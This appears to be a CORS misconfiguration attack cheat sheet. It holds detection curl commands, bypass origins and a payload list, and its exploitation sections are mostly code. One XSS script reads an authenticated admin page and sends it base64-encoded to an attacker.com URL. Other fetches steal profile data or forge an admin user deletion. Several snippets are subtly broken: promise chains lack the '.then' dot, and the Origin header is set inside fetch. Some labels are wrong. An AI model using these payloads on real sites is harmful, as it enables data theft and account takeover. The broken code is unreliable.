#### 1. BASIC DETECTION
# Simple Origin Reflection
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Null Origin Test
curl -H "Origin: null" -I https://target.com/data

# Preflight Request Check
curl -X OPTIONS -H "Origin: https://attacker.com" -H "Access-Control-Request-Method: GET" -I https://target.com/api

#### 2. AUTOMATED TOOLS
# CORScanner (Python)
python cors_scan.py -u https://target.com -v

# CORS Misconfiguration Scanner (Burp Extension)
# Available in BApp Store

# OWASP ZAP
# Use "CORS Scanner" add-on

#### 3. EXPLOITATION TECHNIQUES
# Credential Theft (withCredentials)
fetch('https://target.com/api/user', {
  credentials: 'include',
  headers: { 'Origin': 'https://evil.com' }
})

# Server-Side Cache Poisoning
GET /data HTTP/1.1
Origin: https://evil.com
Host: target.com

# XSS + CORS Bypass
<script>
  fetch('https://target.com/admin', {credentials: 'include'})
    then(r => r.text())
    then(d => location='https://attacker.com/?data='+btoa(d))
</script>

#### 4. COMMON MISCONFIGURATIONS
# Wildcard with Credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Insecure Regex Patterns
Access-Control-Allow-Origin: https://*.target.com  # Accepts https://x.target.com.evil.com

# Null Origin Allowed
Access-Control-Allow-Origin: null

#### 5. BYPASS TECHNIQUES
# Subdomain Takeover
https://target.com.evil.com

# Special Character Abuse
https://target.com_evil.com

# HTTPS Downgrade
http://target.com (when HTTPS is whitelisted)

#### 6. POST-EXPLOITATION
# Steal Sensitive Data
fetch('https://target.com/user/profile', {credentials: 'include'})
  then(response => response.json())
  then(data => exfiltrate(data))

# Perform Privileged Actions
fetch('https://target.com/admin/deleteUser', {
  method: 'POST',
  credentials: 'include',
  body: 'userId=123'
})

#### 7. BLIND DETECTION
# Timing Attack
<script>
  const start = performance.now()
  fetch('https://target.com/internal', {credentials: 'include'})
    finally(() => {
      if (performance.now() - start > 1000) {
        alert('Possible internal endpoint')
      }
    })
</script>

#### PRO TIPS:
# 1. Always test:
#  - All API endpoints
#  - Different HTTP methods
#  - With/without credentials
#  - Non-standard ports

# 2. Critical targets:
#  - Authentication endpoints
#  - User profile APIs
#  - Admin interfaces
#  - Internal services

# 3. Escalation paths:
#  - Sensitive data exposure
#  - Account takeover
#  - Privileged action execution
#  - Internal network reconnaissance

# #### RECOMMENDED PAYLOADS:
#  - Origin: https://evil.com
#  - Origin: null
#  - Origin: target.com.attacker.com
#  - Origin: https://target.com@evil.com

# SECURITY IMPACT:
# - Successful CORS exploitation may lead to:
# - Sensitive data theft
# - Account compromise
# - Privilege escalation
# - Internal service enumeration
# - CSRF-like attacks on authenticated endpoints

#### SAMPLE DETECTION SCRIPT:
```javascript
// cors_tester.js
async function testCORS(url) {
  const origins = [
    'https://evil.com',
    'null',
    'http://target.com.attacker.com',
    'https://target.com@evil.com'
  ]
  
  for (const origin of origins) {
    try {
      const response = await fetch(url, {
        headers: { 'Origin': origin },
        credentials: 'include'
      })
      const acao = response.headers.get('access-control-allow-origin')
      if (acao && acao.includes(origin)) {
        console.log(`Vulnerable CORS config with Origin: ${origin}`)
        if (response.headers.get('access-control-allow-credentials') === 'true') {
          console.log('!! Credentials allowed - Critical vulnerability !!')
        }
      }
    } catch (e) {
      console.error(`Error testing ${origin}:`, e.message)
    }
  }
}

testCORS('https://target.com/api/user')
```
